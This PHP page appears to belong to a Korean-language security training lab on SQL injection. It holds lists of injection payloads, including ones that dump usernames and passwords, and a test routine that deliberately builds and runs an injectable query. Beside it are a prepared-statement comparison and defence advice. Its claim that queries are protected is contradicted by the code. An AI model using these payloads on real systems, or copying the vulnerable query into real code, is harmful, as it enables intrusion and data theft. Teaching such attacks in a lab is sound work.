<?php
// 출력 버퍼링 시작 (헤더 전송 문제 방지)
ob_start();

// 세션 시작 (TestPage 전에)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/../db.php';
require_once __DIR__ . '/../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

require_once 'TestPage.php';

// 1. 페이지 설정
$page_title = 'SQL Injection';
$description = '<p><strong>SQL Injection</strong>은 애플리케이션의 데이터베이스 쿼리에 악의적인 SQL 코드를 삽입하는 공격입니다.</p>
<p>이 페이지에서는 다양한 SQL Injection 기법을 안전한 환경에서 테스트할 수 있습니다.</p>
<p><strong>참고:</strong> 실제 쿼리는 준비된 문(Prepared Statement)으로 보호되어 있어 안전합니다.</p>';

// 2. 페이로드 정의
$payloads = [
    'union' => [
        'title' => '🔗 UNION-based SQL Injection',
        'description' => 'UNION 연산자를 사용하여 다른 테이블의 데이터를 조회하는 기법입니다.',
        'payloads' => [
            "' UNION SELECT null,username,password FROM users--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT null,null,null--",
            "1' UNION SELECT database(),user(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--"
        ]
    ],
    'boolean' => [
        'title' => '✅ Boolean-based SQL Injection',
        'description' => '조건문의 참/거짓 결과를 이용하여 데이터를 추출하는 기법입니다.',
        'payloads' => [
            "1' AND '1'='1",
            "1' AND '1'='2", 
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64--",
            "1' OR 1=1--"
        ]
    ],
    'time' => [
        'title' => '⏱️ Time-based SQL Injection',
        'description' => '시간 지연을 이용하여 정보를 추출하는 블라인드 SQL Injection 기법입니다.',
        'payloads' => [
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT SLEEP(5))--",
            "1'; SELECT pg_sleep(5)--",
            "1' AND BENCHMARK(5000000,MD5(1))--"
        ]
    ],
    'error' => [
        'title' => '❌ Error-based SQL Injection',
        'description' => '의도적으로 오류를 발생시켜 데이터베이스 정보를 노출시키는 기법입니다.',
        'payloads' => [
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "1' AND EXP(~(SELECT * FROM (SELECT version())a))--"
        ]
    ],
    'basic' => [
        'title' => '🔧 Basic SQL Injection',
        'description' => '기본적인 SQL Injection 페이로드들입니다.',
        'payloads' => [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1"
        ]
    ]
];

// 3. 방어 방법 정의
$defense_methods = [
    "<strong>준비된 문(Prepared Statements) 사용:</strong> 가장 효과적인 방어 방법",
    "<strong>입력 값 검증:</strong> 사용자 입력을 철저히 검증",
    "<strong>저장 프로시저 사용:</strong> 동적 SQL 구문 대신 저장 프로시저 활용",
    "<strong>최소 권한 원칙:</strong> 데이터베이스 사용자에게 필요한 최소한의 권한만 부여",
    "<strong>에러 메시지 숨김:</strong> 데이터베이스 오류 정보를 사용자에게 노출하지 않음",
    "<strong>웹 애플리케이션 방화벽(WAF) 사용:</strong> SQL Injection 패턴 탐지 및 차단"
];

// 4. 참고 자료 정의
$references = [
    "PayloadsAllTheThings - SQL Injection" => "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
    "OWASP - SQL Injection" => "https://owasp.org/www-community/attacks/SQL_Injection",
    "PortSwigger - SQL Injection" => "https://portswigger.net/web-security/sql-injection"
];

// 5. 테스트 폼 UI 정의
$payload = htmlspecialchars($_POST['payload'] ?? '');
$test_form_ui = <<<HTML
<form method="post" class="test-form">
    <h3>🧪 페이로드 테스트</h3>
    <label for="payload">SQL Injection 페이로드:</label>
    <textarea name="payload" id="payload" placeholder="여기에 테스트할 페이로드를 입력하거나 위의 버튼을 클릭하세요">{$payload}</textarea>
    <br><br>
    <button type="submit" class="btn" style="background: #dc3545;">테스트 실행</button>
</form>
HTML;

// 6. 테스트 로직 콜백 정의
$test_logic_callback = function($form_data) {
    global $pdo;
    
    // PDO 연결 확인
    if (!isset($pdo) || $pdo === null) {
        return [
            'result' => '',
            'error' => '데이터베이스 연결이 설정되지 않았습니다. 데이터베이스 설정을 확인하세요.'
        ];
    }
    
    $payload = $form_data['payload'] ?? '';
    $result = '';
    $error = '';

    try {
        // 취약한 쿼리 구성
        $vulnerable_query = "SELECT id, username FROM users WHERE id = '" . $payload . "'";
        
        $result .= "<div class='vulnerable-output'>";
        $result .= "<h4>🚨 취약한 SQL 쿼리 실행 결과</h4>";
        $result .= "<p><strong>구성된 쿼리:</strong></p>";
        $result .= "<pre class='attack-result'>" . htmlspecialchars($vulnerable_query) . "</pre>";
        
        // SQL 인젝션 패턴 분석
        $injection_detected = false;
        $attack_type = "";
        
        if (preg_match("/('|\"|;|--|\/\*|\*\/|union|select|insert|update|delete|drop|create|alter)/i", $payload)) {
            $injection_detected = true;
            
            // 공격 유형 분석
            if (stripos($payload, 'union') !== false) {
                $attack_type = "UNION-based SQL Injection";
            } elseif (stripos($payload, "' or") !== false || stripos($payload, "or 1=1") !== false) {
                $attack_type = "Boolean-based SQL Injection";
            } elseif (stripos($payload, 'sleep') !== false || stripos($payload, 'waitfor') !== false) {
                $attack_type = "Time-based SQL Injection";
            } elseif (stripos($payload, 'extractvalue') !== false || stripos($payload, 'updatexml') !== false) {
                $attack_type = "Error-based SQL Injection";
            } else {
                $attack_type = "SQL Injection";
            }
        }
        
        // 실제 쿼리 실행 시도
        try {
            $stmt = $pdo->query($vulnerable_query);
            
            if ($stmt) {
                $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                
                if ($injection_detected) {
                    $result .= "<p class='danger'>🔥 <strong>{$attack_type} 공격 감지!</strong></p>";
                }
                
                $result .= "<p><strong>쿼리 실행 상태:</strong> 성공</p>";
                $result .= "<p><strong>반환된 레코드 수:</strong> " . count($results) . "개</p>";
                
                if ($results) {
                    $result .= "<p><strong>조회된 데이터:</strong></p>";
                    $result_data = "";
                    foreach ($results as $index => $row) {
                        $result_data .= "레코드 " . ($index + 1) . ":\n";
                        foreach ($row as $column => $value) {
                            $result_data .= "  - {$column}: " . ($value ?? 'NULL') . "\n";
                        }
                        $result_data .= "\n";
                        
                        // 최대 5개 레코드만 표시
                        if ($index >= 4) {
                            if (count($results) > 5) {
                                $result_data .= "... (추가 " . (count($results) - 5) . "개 레코드 생략)\n";
                            }
                            break;
                        }
                    }
                    $result .= "<pre class='attack-result'>" . htmlspecialchars($result_data) . "</pre>";
                    
                    // 민감한 정보 노출 경고
                    $sensitive_data = false;
                    foreach ($results as $row) {
                        if (isset($row['password']) || isset($row['email']) || count($results) > 1) {
                            $sensitive_data = true;
                            break;
                        }
                    }
                    
                    if ($sensitive_data) {
                        $result .= "<p class='danger'>🔥 <strong>민감한 데이터 노출 위험!</strong> 실제 환경에서는 사용자 정보가 노출될 수 있습니다.</p>";
                    }
                } else {
                    $result .= "<p class='warning'>⚠️ 쿼리는 성공했지만 조건에 맞는 데이터가 없습니다.</p>";
                }
            }
            
        } catch (PDOException $db_error) {
            $result .= "<p class='error'>❌ <strong>데이터베이스 오류:</strong> " . htmlspecialchars($db_error->getMessage()) . "</p>";
            
            // Error-based injection 감지
            if ($injection_detected && stripos($payload, 'extractvalue') !== false || stripos($payload, 'updatexml') !== false) {
                $result .= "<p class='danger'>🔥 <strong>Error-based SQL Injection 시도!</strong> 오류 메시지를 통한 정보 추출 시도가 감지되었습니다.</p>";
            }
            
            // 구문 오류에 대한 교육적 설명
            if (strpos($db_error->getMessage(), 'syntax error') !== false) {
                $result .= "<p class='warning'>💡 <strong>구문 오류 발생:</strong> 잘못된 SQL 문법으로 인해 쿼리가 실패했습니다. 실제 공격에서는 이러한 오류를 통해 데이터베이스 구조를 파악할 수 있습니다.</p>";
            }
        }
        
        $result .= "</div>";
        
        // 안전한 구현 비교
        $result .= "<div class='safe-comparison'>";
        $result .= "<h4>✅ 안전한 Prepared Statement 구현</h4>";
        
        try {
            // 안전한 쿼리 실행
            $safe_query = "SELECT id, username FROM users WHERE id = ?";
            $safe_stmt = $pdo->prepare($safe_query);
            $safe_stmt->execute([$payload]);
            $safe_results = $safe_stmt->fetchAll(PDO::FETCH_ASSOC);
            
            $result .= "<p><strong>안전한 쿼리:</strong></p>";
            $result .= "<pre class='safe-result'>" . htmlspecialchars($safe_query) . "\n매개변수: [" . htmlspecialchars($payload) . "]</pre>";
            $result .= "<p><strong>결과:</strong> " . count($safe_results) . "개 레코드 (SQL 인젝션 방어됨)</p>";
            
            if (count($safe_results) > 0) {
                $result .= "<p class='success'>🛡️ Prepared Statement로 인해 악의적인 SQL 코드가 무력화되었습니다.</p>";
            } else {
                $result .= "<p class='success'>🛡️ 유효한 ID가 아니므로 결과가 없습니다. SQL 인젝션이 방어되었습니다.</p>";
            }
            
        } catch (PDOException $safe_error) {
            $result .= "<p class='success'>🛡️ 안전한 처리 중: " . htmlspecialchars($safe_error->getMessage()) . "</p>";
        }
        
        $result .= "</div>";
        
        // 보안 권장사항
        $result .= "<div class='security-recommendations'>";
        $result .= "<h4>🔒 SQL Injection 방어 권장사항</h4>";
        $result .= "<ul>";
        $result .= "<li><strong>Prepared Statements:</strong> 매개변수화된 쿼리 사용 (가장 효과적)</li>";
        $result .= "<li><strong>입력 검증:</strong> 사용자 입력의 타입, 길이, 형식 검증</li>";
        $result .= "<li><strong>이스케이프 처리:</strong> 특수 문자를 적절히 이스케이프</li>";
        $result .= "<li><strong>최소 권한:</strong> 데이터베이스 계정에 필요한 최소 권한만 부여</li>";
        $result .= "<li><strong>오류 메시지 숨김:</strong> 상세한 데이터베이스 오류 정보 노출 금지</li>";
        $result .= "<li><strong>WAF 사용:</strong> 웹 애플리케이션 방화벽으로 SQL 인젝션 패턴 차단</li>";
        $result .= "</ul>";
        $result .= "</div>";
        
    } catch (Exception $e) {
        $error = "전체 처리 중 오류 발생: " . htmlspecialchars($e->getMessage());
    }

    return ['result' => $result, 'error' => $error];
};

// 7. TestPage 인스턴스 생성 및 실행
$test_page = new TestPage($page_title, $description, $payloads, $defense_methods, $references, 'SQL_Injection_Analysis.md');
$test_page->set_test_form($test_form_ui);
$test_page->set_test_logic($test_logic_callback);
$test_page->run();